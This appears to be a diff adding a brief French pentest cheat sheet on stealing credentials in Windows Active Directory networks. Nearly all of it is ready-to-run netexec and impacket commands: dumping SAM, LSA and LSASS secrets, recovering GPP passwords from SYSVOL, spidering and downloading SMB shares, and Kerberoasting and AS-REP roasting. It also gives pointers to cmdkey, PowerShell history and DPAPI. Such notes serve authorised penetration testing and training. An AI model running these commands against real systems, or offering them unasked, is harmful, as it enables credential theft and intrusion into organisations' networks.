@@ -1,0 +1,22 @@
+Creds
+
+Si admin local
+Dump sam et lsass
+nxc smb <IP> -u user -p pass --local-auth --sam
+nxc smb <IP> -u user -p pass --local-auth --lsa / -M lsassy 
+
+Sans être admin local
+GPP présent dans sysvol sur le DC
+nxc smb <IP> -u user -p pass -M gpp_password
+
+Leak dans share smb 
+nxc smb <range> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True
+Puis ls -a dans les shares 
+
+Kerberoast et Asreproast
+impacket-GetUserSPNs domain/user:pass -dc-ip <IP> -request
+impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -dc-ip <IP>
+
+changer pwsh par cmd puis cmdkey /list
+historique PowerShell
+dpapi 
